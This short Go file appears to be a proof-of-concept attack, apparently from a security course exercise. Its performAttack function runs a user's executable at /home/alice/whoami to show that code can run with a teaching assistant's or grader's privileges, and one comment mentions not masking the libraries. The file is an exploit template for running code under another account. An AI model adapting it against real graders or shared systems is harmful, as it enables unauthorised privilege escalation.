package main

/* no need to mask libraries */
import (
        "bytes"
        "os/exec"
        "fmt"
)

func performAttack() {
        /* prove that I can run an executable with TA privileges */
        cmd := exec.Command("/home/alice/whoami")
        var out bytes.Buffer
        cmd.Stdout = &out
        cmd.Run()
        fmt.Printf("%s", out.String())
}
